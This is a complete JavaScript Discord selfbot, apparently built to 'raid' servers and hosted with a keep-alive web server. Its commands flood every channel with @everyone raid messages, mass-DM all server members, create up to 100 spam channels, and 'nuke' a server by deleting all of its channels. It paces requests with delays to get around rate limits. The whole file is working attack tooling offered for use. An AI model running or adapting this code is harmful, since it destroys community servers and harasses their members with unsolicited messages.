const { Client } = require('discord.js-selfbot-v13');
const client = new Client();

const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('VAMO selfbot is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

client.on('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`VAMO RAID SELFBOT READY`);
    console.log(`Type !help for commands`);
});

// Your exact raid message
const raidMessage = `@everyone @here **RAIDED BY VAMBO**

### NEVER SCAM AGAIN SON😂
            😯KICK ROCKS😯
https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif`;

// Helper function for delay
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

client.on('messageCreate', async (message) => {
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== HELP COMMAND =====
    if (command === 'help') {
        await message.channel.send(`**🔥 VAMO RAID SELFBOT**

!syncspam - ALL channels get message #1 together, #2 together (100 each)
!flood [count] - Flood current channel
!spamchannels [num] - Create raid channels
!massdm - DM all members (improved with privacy handling)
!nuke - Delete all + create 100 channels
!myperms - Check your permissions in this server
!help - Show this menu

✅ VAMO ACTIVATED`);
    }

    // ===== CHECK PERMISSIONS COMMAND =====
    if (command === 'myperms') {
        const guild = message.guild;
        const member = guild.members.cache.get(client.user.id);
        
        const perms = {
            sendMessages: member.permissions.has('SendMessages'),
            manageChannels: member.permissions.has('ManageChannels'),
            administrator: member.permissions.has('Administrator')
        };
        
        await message.channel.send(`**Your Permissions in ${guild.name}:**
Send Messages: ${perms.sendMessages ? '✅' : '❌'}
Manage Channels: ${perms.manageChannels ? '✅' : '❌'}
Administrator: ${perms.administrator ? '✅' : '❌'}

Without Manage Channels, you CANNOT create/delete channels.
Mass DM works regardless of permissions!`);
    }

    // ===== SYNC SPAM - ALL CHANNELS TOGETHER =====
    if (command === 'syncspam') {
        const guild = message.guild;
        if (!guild) return;

        await message.channel.send('✅ VAMO ACTIVATED - SYNC MODE');
        
        const channels = guild.channels.cache.filter(c => 
            c.type === 'GUILD_TEXT' && 
            c.permissionsFor(guild.members.me).has('SendMessages')
        );

        const channelList = [...channels.values()];
        const channelCount = channelList.length;
        
        if (channelCount === 0) {
            await message.channel.send('❌ No accessible channels found');
            return;
        }

        console.log(`🔥 SYNC SPAM: ${channelCount} channels will get messages #1-100 TOGETHER`);

        let totalSent = 0;

        for (let msgNum = 1; msgNum <= 100; msgNum++) {
            console.log(`\n📢 Sending message #${msgNum} to ALL ${channelCount} channels simultaneously...`);
            
            const sendPromises = channelList.map(async (channel) => {
                try {
                    await channel.send(raidMessage);
                    return { success: true };
                } catch (error) {
                    console.log(`   ❌ Failed in #${channel.name}: ${error.message}`);
                    return { success: false };
                }
            });

            const results = await Promise.allSettled(sendPromises);
            const successful = results.filter(r => r.status === 'fulfilled' && r.value.success).length;
            totalSent += successful;
            
            console.log(`   ✅ Message #${msgNum} sent to ${successful}/${channelCount} channels`);
            await delay(1500);
        }

        console.log('\n' + '='.repeat(60));
        console.log(`✅ SYNC SPAM COMPLETE!`);
        console.log(`📊 Total messages sent: ${totalSent}`);
        console.log('='.repeat(60));
    }

    // ===== FLOOD CURRENT CHANNEL =====
    if (command === 'flood') {
        await message.channel.send('✅ VAMO ACTIVATED');
        
        const count = parseInt(args[0]) || 100;
        const channel = message.channel;

        console.log(`🔥 FLOOD: Sending ${count} messages to #${channel.name}...`);

        for (let i = 1; i <= count; i++) {
            try {
                await channel.send(raidMessage);
                
                if (i % 10 === 0) {
                    console.log(`   ✅ ${i}/${count} messages sent`);
                }
                
                await delay(1000);
                
            } catch (error) {
                console.log(`   ❌ Failed message ${i}: ${error.message}`);
                
                if (error.message.includes('rate')) {
                    console.log('   ⏳ Rate limited, waiting 5 seconds...');
                    await delay(5000);
                }
            }
        }

        console.log(`✅ FLOOD COMPLETE`);
    }

    // ===== IMPROVED MASS DM COMMAND =====
    if (command === 'massdm') {
        const guild = message.guild;
        await message.channel.send('✅ VAMO ACTIVATED - MASS DM STARTED');

        console.log(`🔥 Mass DM to ${guild.memberCount} members...`);

        let sent = 0;
        let blocked = 0;
        let failed = 0;

        for (const member of guild.members.cache.values()) {
            // Skip bots and yourself
            if (member.user.bot || member.id === client.user.id) continue;

            try {
                await member.send(raidMessage);
                sent++;
                
                if (sent % 5 === 0) {
                    console.log(`✅ DMs sent: ${sent}`);
                }
                
                // CRITICAL: 2.5 second delay to avoid rate limits
                await delay(2500); 
                
            } catch (error) {
                // Check for specific error codes
                if (error.code === 50007) {
                    blocked++; // User has DMs disabled
                    console.log(`🔒 Blocked: ${member.user.tag} (privacy settings)`);
                } else if (error.code === 50013) {
                    failed++; // Missing permissions
                    console.log(`❌ Failed: ${member.user.tag} (missing permissions)`);
                } else {
                    failed++;
                    console.log(`❌ Failed: ${member.user.tag} - ${error.message}`);
                }
                
                // If rate limited, wait longer
                if (error.message && error.message.includes('rate')) {
                    console.log('⏳ Rate limited, waiting 10 seconds...');
                    await delay(10000);
                }
            }
        }

        console.log('\n' + '='.repeat(50));
        console.log(`✅ MASS DM COMPLETE`);
        console.log(`📨 Sent: ${sent}`);
        console.log(`🔒 Privacy blocked: ${blocked}`);
        console.log(`❌ Failed: ${failed}`);
        console.log('='.repeat(50));
        
        // Send summary to channel
        try {
            await message.channel.send(`**MassDM Complete**\n✅ Sent: ${sent}\n🔒 Privacy blocked: ${blocked}\n❌ Failed: ${failed}`);
        } catch (e) {}
    }

    // ===== SPAM CHANNELS COMMAND (CREATE CHANNELS) =====
    if (command === 'spamchannels') {
        const guild = message.guild;
        if (!guild) return;

        await message.channel.send('✅ VAMO ACTIVATED');

        let channelCount = parseInt(args[0]) || 50;
        if (channelCount > 100) channelCount = 100;

        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';
        
        console.log(`🔥 Creating ${channelCount} channels...`);

        for (let i = 1; i <= channelCount; i++) {
            try {
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text'
                });
                await newChannel.send(raidMessage);
                console.log(`✅ Created channel ${i}/${channelCount}`);
                await delay(1000);
            } catch (error) {
                console.log(`❌ Failed: ${error.message}`);
            }
        }
    }

    // ===== NUKE COMMAND =====
    if (command === 'nuke') {
        const guild = message.guild;
        if (!guild) return;

        await message.channel.send('✅ VAMO ACTIVATED - NUKE STARTED');

        // Check if user has permission
        const member = guild.members.cache.get(client.user.id);
        if (!member.permissions.has('ManageChannels')) {
            await message.channel.send('❌ Cannot nuke: Missing `Manage Channels` permission');
            return;
        }

        // Delete all channels
        console.log('🔥 Deleting all channels...');
        for (const channel of guild.channels.cache.values()) {
            try {
                await channel.delete();
                console.log(`✅ Deleted ${channel.name}`);
                await delay(800);
            } catch (error) {
                console.log(`❌ Failed to delete: ${error.message}`);
            }
        }

        // Create 100 channels
        console.log('🔥 Creating 100 channels...');
        const channelName = 'R҉A҉I҉D҉ ҉B҉Y҉ ҉V҉A҉M҉B҉O҉';

        for (let i = 1; i <= 100; i++) {
            try {
                const newChannel = await guild.channels.create(`${channelName}-${i}`, {
                    type: 'text'
                });
                await newChannel.send(raidMessage);
                console.log(`✅ Created channel ${i}/100`);
                await delay(1000);
            } catch (error) {
                console.log(`❌ Failed: ${error.message}`);
            }
        }

        console.log('✅ NUKE COMPLETE');
    }
});

client.login(TOKEN);
